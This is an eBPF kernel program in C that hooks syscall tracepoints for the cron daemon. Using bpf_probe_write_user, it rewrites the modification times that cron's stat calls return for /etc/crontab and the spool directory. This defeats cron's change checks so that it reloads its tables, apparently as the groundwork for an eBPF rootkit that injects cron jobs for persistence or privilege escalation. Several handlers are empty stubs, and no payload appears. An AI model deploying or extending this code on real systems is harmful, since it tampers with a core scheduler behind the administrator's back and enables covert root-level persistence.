// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
/* Copyright (c) 2020 Facebook */

#define BPF_NO_PRESERVE_ACCESS_INDEX
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>

#define TARGET_NAME "cron"
#define SPOOL_DIR	"tabs"
#define CRONTAB	"/etc/crontab"
#define SYSCRONTAB "/etc/crontab"
#define TASK_COMM_LEN			16





int my_pid = 0;
int cron_pid = 0;
char debug_fmt[] = "DEBUG";
char get_syscall_fmt[] = "syscall: %x";
char print_comm_fmt[] = "%s";
char filename_saved[65]={0};
char openat_filename_saved[0x40]={0};
struct stat * statbuf_ptr=NULL;
int open_fd=0;


/* Another Helpers */
static __inline int my_memcmp(const void* s1, const void* s2, size_t cnt);
static __inline void *my_memcpy(void* dest, const void* src, size_t count);

/* Enter Hook Operation */
static __inline int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_read(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_close(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_fstat(struct bpf_raw_tracepoint_args *ctx);

/* Exit Hook Operation */
static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_exit_stat();
static __inline int handle_exit_fstat();
static __inline int handle_exit_openat(struct bpf_raw_tracepoint_args *ctx);




static __inline int my_memcmp(const void* s1, const void* s2, size_t cnt){

  const char *t1 = s1;
  const char *t2 = s2;

  int res = 0;
  while(cnt-- > 0){
    if(*t1 > *t2){
      res =1;
      break;
    }
    else if(*t1 < *t2){
      res = -1;
      break;
    }
    else{
      t1++;
      t2++;
    }
  }

  return res;
}
static __inline void *my_memcpy(void* dest, const void* src, size_t count)
{


       char* pdest =(char*) dest;

       const char* psrc =(const char*) src;

       if (psrc > pdest || pdest >= psrc + count)

       {

              while (count--)

              *pdest++ = *psrc++;

       }

       else

       {

               while (count--)

               {

                     *(pdest + count) = *(psrc + count);

              }

       }

return dest;

}


static __inline int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx){
  
	struct pt_regs *regs;
	char buf[0x40];
	char *pathname ;

	regs = (struct pt_regs *)ctx->args[0];

  // Read the correspoding string which ends at NULL
	pathname = (char *)PT_REGS_PARM1_CORE(regs);
	bpf_probe_read_str(buf,sizeof(buf),pathname);
	
  // Check if the file is "/etc/crontab" or "crontabs"
  if(my_memcmp(buf , CRONTAB , sizeof(CRONTAB)) && my_memcmp(buf,SPOOL_DIR,sizeof(SPOOL_DIR)))	
		return 0;

	if(cron_pid == 0){
		cron_pid = bpf_get_current_pid_tgid() & 0xffffffff;
	}

  my_memcpy(filename_saved , buf , 64);

  // Read the file's state address, saved into statbuf_ptr
  statbuf_ptr = (struct stat *)PT_REGS_PARM2_CORE(regs);
  //bpf_probe_read(&statbuf_ptr , sizeof(statbuf_ptr) , regs->si);

	return 0;
}

static __inline int handle_enter_read(struct bpf_raw_tracepoint_args *ctx){
	return 0;
}

static __inline int handle_enter_close(struct bpf_raw_tracepoint_args *ctx){
	return 0;
}

static __inline int handle_enter_fstat(struct bpf_raw_tracepoint_args *ctx){
  
  // prototype:  int fstat(int fd, struct stat *statbuf)

  struct pt_regs *regs;
	regs = (struct pt_regs *)ctx->args[0];

  if(open_fd==0 || openat_filename_saved[0]==0){
    return 0;
  }

  // Ensure the fstat is called for SYSCRONTAB
  if(open_fd != regs->di){
    return 0;
  }

	return 0;
}

// if ((crontab_fd = open(tabname, O_RDONLY|O_NONBLOCK|O_NOFOLLOW, 0)) < OK) 
static __inline int handle_enter_openat(struct bpf_raw_tracepoint_args *ctx){
  struct pt_regs *regs;  // Get args
  char buf[0x40];
	char *pathname;
  
  regs = (struct pt_regs *)ctx->args[0];
  // Read the correspoding string which ends at NULL
  // int openat(int  dirfd , const char * pathname
	pathname = (char *)PT_REGS_PARM2_CORE(regs);
  bpf_probe_read_str(buf,sizeof(buf),pathname);

  // Check if open SYSCRONTAB
  if(my_memcmp(buf , SYSCRONTAB , sizeof(SYSCRONTAB)))	
		return 0;
  
  // Save to openat_filename_saved
  my_memcpy(openat_filename_saved , buf , 64);

	return 0;
}

static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx){

	return 0;
}


static __inline int handle_exit_stat(){

  //struct stat *real_statbuf_ptr = (struct stat *)statbuf_ptr;
  
  // Ensure that statbuf_ptr has been initialized by handle_enter_stat(ctx)
  if(statbuf_ptr == 0){
    return 0;
  }

  bpf_printk("cron %d stat() %s\n",cron_pid , filename_saved);

  /*
  
  At this point, we need to make sure that the following two conditions are both passed.
  Which is equivalent to :

  !TEQUAL(old_db->mtim, TMAX(statbuf.st_mtim, syscron_stat.st_mtim))    [1]
  !TEQUAL(syscron_stat.st_mtim, ts_zero)                                [2]

  */

 // We are tend to set statbuf.st_mtim ZERO and set syscron_stat.st_mtim a SMALL RANDOM VALUE
 __kernel_ulong_t spool_dir_st_mtime = 0;
 __kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() & 0xffff;  //bpf_get_prandom_u32 Returns a pseudo-random u32.

 // Ensure the file is our target

 // If we are checking SPOOL_DIR
 if(!my_memcmp(filename_saved , SPOOL_DIR , sizeof(SPOOL_DIR))){
   bpf_probe_write_user(&statbuf_ptr->st_mtime , &spool_dir_st_mtime , sizeof(spool_dir_st_mtime) );
 }

 if(!my_memcmp(filename_saved , CRONTAB , sizeof(CRONTAB))){
   bpf_probe_write_user(&statbuf_ptr->st_mtime , &crontab_st_mtime ,sizeof(crontab_st_mtime));
 }

 // update
 statbuf_ptr = 0;
  return 0;
}

static __inline int handle_exit_fstat(){

  if(open_fd==0 || openat_filename_saved[0]==0){
    return 0;
  }


  bpf_printk("fstat() %d, %s\n",open_fd , openat_filename_saved);

  return 0;
}


static __inline int handle_exit_openat(struct bpf_raw_tracepoint_args *ctx){

  if(openat_filename_saved[0]==0){
    return 0;
  }
  // Ensure we open SYSCROnTAB
  if(!my_memcmp(openat_filename_saved , SYSCRONTAB , sizeof(SYSCRONTAB)))
  {
    // save the corresponding file descriptor
    open_fd = ctx->args[1];
    bpf_printk("openat: %s, %d\n",openat_filename_saved , open_fd);
    openat_filename_saved[0] = '\0';
  }
	return 0;
}


SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx)
{

	unsigned long syscall_id = ctx->args[1];
	char comm[TASK_COMM_LEN];
  // Get Commandline 
	bpf_get_current_comm(&comm , sizeof(comm));

	// Check if it is "cron"
	char miss_fmt[] = "It is not cron, it's %s";
	if(my_memcmp(comm,TARGET_NAME , sizeof(TARGET_NAME))){
		//bpf_trace_printk(miss_fmt , sizeof(miss_fmt)+0x10, comm);
		return 0;
	}

	// char fmt[] = "cron is triggered ! %x\n";
	// bpf_trace_printk(fmt, sizeof(fmt), syscall_id);
	// Triage by syscall number
	 switch (syscall_id)
    {
        case 0:
            handle_enter_read(ctx);
            break;
        case 3:  // close
            handle_enter_close(ctx);
            break;
        case 4:
            handle_enter_stat(ctx);
            break;
        case 5:
            handle_enter_fstat(ctx);
            break;
        case 257:
            handle_enter_openat(ctx);
            break;
        default:
            return 0;
    }

 	return 0;
}

SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
{
    if (cron_pid == 0)
        return 0;
    int pid = bpf_get_current_pid_tgid() & 0xffffffff;
    if (pid != cron_pid)
        return 0;
    unsigned long id;
    struct pt_regs *regs = ctx->args[0];
    // Read syscall_id from orig_ax
    bpf_probe_read_kernel(&id, sizeof(id), regs->orig_ax);
    switch (id)
    {
        case 0:
            handle_exit_read(ctx);
            break;
        case 4:
            handle_exit_stat();
            break;
        case 5:
            handle_exit_fstat();
            break;
        case 257:
            handle_exit_openat(ctx);
            break;
        default:
            return 0;
    }
    return 0;
}


char LICENSE[] SEC("license") = "GPL";